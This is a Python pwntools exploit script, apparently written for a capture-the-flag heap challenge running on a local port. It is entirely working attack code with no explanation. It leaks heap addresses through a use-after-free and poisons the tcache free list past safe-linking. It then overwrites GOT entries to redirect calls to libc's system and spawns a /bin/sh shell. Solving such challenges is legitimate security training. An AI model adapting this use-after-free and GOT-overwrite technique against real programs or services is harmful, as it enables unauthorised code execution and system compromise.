from pwn import *

#p=process("./chall_patched")
elf=ELF("./chall_patched")
p=remote("127.0.0.1",8000)
#gdb.attach(p)
context(os='linux',arch='amd64')


def create(sz,data):
    #sleep(1)
    p.recvuntil(b"[5] Just give up")
    p.sendline(b"1")
    p.recvuntil(b"0x40 words")
    p.sendline(str(sz))
    p.recvuntil(b"answer?")
    p.sendline(data)

def modify(idx,data):
    p.recvuntil(b"[5] Just give up")
    p.sendline(b"2")
    p.recvuntil(b"stored")
    p.sendline(str(idx))
    p.recvuntil(b"count")
    p.sendline(data)

def remove(idx):
    p.recvuntil(b"[5] Just give up")
    p.sendline(b"3")
    p.recvuntil(b"forget?")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil(b"[5] Just give up")
    p.sendline(b"4")
    p.recvuntil(b"remember?")
    p.sendline(str(idx))
    sleep(0.1)
    return p.recvuntil(b"What")[:-4]

create(0x30,"a"*0x10+"cat flag.txt\x00") #chunk 0
#p.recvuntil(b"[5] Just give up")

create(0x30,"aaaa") #chunk 1
#p.recvuntil(b"[5] Just give up")

remove(0)
#p.recvuntil(b"[5] Just give up")

remove(1)
#p.recvuntil(b"[5] Just give up")

chunk_0=(u64(view(0)[1:-1].ljust(8,b"\x00"))<<12)|0x6b0
#p.recvuntil(b"[5] Just give up")
#p.interactive()
chunk_1=chunk_0+0x40
print(hex(chunk_0))
print(hex(chunk_1))
payload_1=p64((chunk_1>>12)^(elf.sym.entry_msg))

modify(1,payload_1)
#p.recvuntil(b"[5] Just give up") #fixes weird I/O issue
create(0x30,"aaaa") #2
#p.recvuntil(b"[5] Just give up")

create(0x30,p64(elf.got.puts)+b"/bin/sh\x00"+p64(elf.sym.main)) #3

p.sendline(b"5")
#p.interactive()
p.recvuntil(b"Wrong answer...\n")
puts_leak=u64(p.recvuntil(b"\n")[:-1].ljust(8,b"\x00"))
system=puts_leak-0x2d490
print(hex(system))


create(0x40,"aaaa") #chunk 4
#p.recvuntil(b"[5] Just give up")
create(0x40,"aaaa") #chunk 5
#p.recvuntil(b"[5] Just give up")
remove(4)
remove(5)

#p.sendline(b"5")

chunk_5=((chunk_0>>12)<<12)|0x790
print(hex(chunk_5))
modify(5,p64((chunk_5>>12)^(elf.got.puts-0x10)))
#p.recvuntil(b"[5] Just give up")


#p.recvuntil(b"[5] Just give up")
sleep(1)
free=system+0x50130
printf=puts_leak-0x26ca0
read=system+0xb0d80
create(0x40,"aaaa")
create(0x40,p64(free)+p64(0x000000401046)+p64(system)+p64(printf)+p64(read))
p.clean()
#sleep(3)
#modify(3,"aBCDEFG")
p.sendline("2")
p.sendline("3")
#p.sendline("abcdefg")
sleep(1)
#p.sendline(b"5")
p.sendline(b"/bin/sh\x00")
p.sendline(b"4")
p.sendline(b"3")
p.interactive()
